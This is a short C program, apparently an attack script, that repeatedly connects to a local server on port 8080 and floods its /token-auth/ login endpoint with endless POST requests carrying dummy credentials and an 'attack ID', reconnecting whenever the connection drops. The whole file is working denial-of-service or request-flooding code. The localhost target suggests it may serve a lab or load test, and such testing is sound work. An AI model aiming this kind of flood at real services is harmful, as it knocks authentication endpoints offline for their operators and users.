#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define PORT 8080
#define TARGET_IP "127.0.0.1"

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <attack_id>\n", argv[0]);
        return 1;
    }

    char *attack_id = argv[1];

    char body[128];
    int body_len = snprintf(body, sizeof(body), "username=none&password=none&id=%s", attack_id);

    char request[512];
    int req_len = snprintf(request, sizeof(request),
        "POST /token-auth/ HTTP/1.1\r\n"
        "Host: 127.0.0.1\r\n"
        "Content-Length: %d\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Connection: keep-alive\r\n\r\n"
        "%s", body_len, body);

    int sock;
    struct sockaddr_in server;
    char buffer[1024];

    // reconnect if fails 
    while (1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = inet_addr(TARGET_IP);
        server.sin_port = htons(PORT);

        connect(sock, (struct sockaddr *)&server, sizeof(server));


        printf("===== connected sending Attack ID: %s =====\n", attack_id);

        int count = 0;
        
        // spam request
        while (1) {
            if (send(sock, request, req_len, 0) < 0) {
                break;
            }
            
            // drain buffer
            if (recv(sock, buffer, sizeof(buffer)-1, 0) <= 0) {
                printf("===== reconnecting =====\n");
                break;
            }

            count++;
            if (count % 10000 == 0) {
                //printf(" ===== Sent %d requests =====\n", count);
            }
        }
        close(sock);
    }
    return 0;
}